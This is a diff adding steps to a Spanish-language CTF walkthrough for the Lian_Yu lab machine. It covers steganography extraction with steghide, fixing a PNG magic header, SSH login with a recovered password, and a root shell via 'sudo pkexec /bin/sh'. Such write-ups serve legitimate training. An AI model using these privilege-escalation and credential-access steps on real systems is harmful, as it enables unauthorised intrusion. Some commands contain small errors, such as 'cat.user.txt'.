@@ -247,23 +247,191 @@ Leave_me_alone.png
 
 ![nmap](Maquina_de_Linux/Lian_Yu/imagenes/codigofuente.png)
 
-### 14.1 Búsqueda de información con strings
+
+## 15. Análisis de los archivos descargados
+
+Una vez descargados los ficheros desde el FTP, se procede a su análisis para identificar posibles datos ocultos o pistas relevantes.
+
+Archivos obtenidos:
 
 ```bash
-strings aa.jpg | less
-binwalk aa.jpg
-exiftool aa.jpg
-steghide info aa.jpg
+aa.jpg
+Queen's_Gambit.png
+Leave_me_alone.png
 ```
 
-## 14.2 Extracción de información oculta (STEGO)
+## 16. Identificación del formato real con xxd
 
-Tras ejecutar:
+Antes de analizarlos como imágenes, se inspecciona su contenido en hexadecimal para comprobar su estructura real:
 
 ```bash
-steghide info aa.jpg
+xxd aa.jpg | head
+xxd "Queen's_Gambit.png" | head
+xxd Leave_me_alone.png | head
 ```
 
-se detecta que el archivo contiene datos ocultos y solicita una contraseña.
+![nmap](Maquina_de_Linux/Lian_Yu/imagenes/imagenformato.png)
+
+Esto permite verificar:
+
+si el archivo coincide con su extensión real
+si ha sido renombrado
+si contiene firmas válidas de imagen
 
 
+## 17. Corregir formato de las imagenes
+
+Observamos que las imagenes que descargamos y analizamos no coincide el farmato una de ellas. Vamos a usar una página para corregirlo y ver la imagen.
+
+Entramos en la página:
+
+```bash
+https://hexed.it
+```
+
+![nmap](Maquina_de_Linux/Lian_Yu/imagenes/corregirformato.png)
+
+Vamos a poner los números asi:
+
+```bash
+89 50 4E 47 0D 0A 1A 0A
+```
+
+Después de arreglar el formato, vamos a exportarlo y se verá la imagen. vemos que la contraseña es:password
+
+
+## 18. Extracción con steghide
+
+Una vez identificada la contraseña en la imagen corregida, se procede a comprobar si el archivo aa.jpg contiene información oculta mediante esteganografía.
+
+Se utiliza steghide para inspeccionar el archivo:
+
+```bash
+steghide info aa.jpg -p password
+```
+
+![nmap](Maquina_de_Linux/Lian_Yu/imagenes/steghide.png)
+
+El análisis revela que el archivo contiene información oculta, indicando la presencia de un fichero embebido:
+
+```bash
+ss.zip
+```
+
+## 19. Extracción del contenido oculto
+
+Se procede a extraer los datos ocultos dentro de la imagen:
+
+```bash
+steghide extract -sf aa.jpg
+```
+
+![nmap](Maquina_de_Linux/Lian_Yu/imagenes/steghide2.png)
+
+Tras la ejecución del comando, se obtiene un archivo comprimido oculto que contiene información relevante para la continuación del reto.
+
+```bash
+unzip ss.zip
+```
+
+Luego vemos lo que hay dentro del archivo.
+
+```bash
+cat passwd.txt
+```
+
+Vemos una nota con el nombre de Oliver, miramos otro archivo.
+
+```bash
+cat shado
+```
+
+Dentro del archivo aparece una posible contraseña: M3tahuman
+
+
+## 20. Acceso por SSH
+
+Con la información obtenida, se prueba el acceso al sistema utilizando el usuario identificado previamente durante la enumeración del FTP:
+
+```bash
+ssh slade@10.129.151.19
+```
+
+![nmap](Maquina_de_Linux/Lian_Yu/imagenes/ssh.png)
+
+Se introduce la contraseña:
+
+```bash
+M3tahuman
+```
+
+La autenticación es correcta y se obtiene acceso al sistema como el usuario slade.
+
+## 21. Escalada de privilegios
+
+Una vez dentro del sistema, se procede a enumerar los permisos del usuario:
+
+```bash
+sudo -l
+```
+
+![nmap](Maquina_de_Linux/Lian_Yu/imagenes/sudo-l.png)
+
+El resultado muestra que el usuario puede ejecutar el binario:
+
+```bash
+/usr/bin/pkexec
+```
+
+## 22. Obtención de root
+
+Según la técnica documentada en GTFOBins, es posible escalar privilegios abusando de pkexec.
+
+Se ejecuta el siguiente comando:
+
+```bash
+sudo pkexec /bin/sh
+```
+
+![nmap](Maquina_de_Linux/Lian_Yu/imagenes/root.png)
+
+Tras la ejecución, se obtiene una shell con privilegios de root.
+
+
+## 23. Obtención de la bandera de root
+
+Una vez obtenida la sesión SSH como el usuario slade, se procede a buscar la flag de usuario.
+
+Primero se comprueba el usuario actual y el directorio de trabajo:
+
+```bash
+whoami
+pwd
+cd /root
+ls
+cat root.txt
+```
+![nmap](Maquina_de_Linux/Lian_Yu/imagenes/catroot.png)
+
+
+## 24. Obtención de la bandera de user
+
+Se revisa el directorio home del usuario:
+
+```bash
+ls /home/slade
+```
+
+Se identifica el archivo de usuario:
+
+```bash
+user.txt
+```
+
+Vamos abrir el txt para ver la flag.
+
+```bash
+cat.user.txt
+```
+
+![nmap](Maquina_de_Linux/Lian_Yu/imagenes/catuser.png)
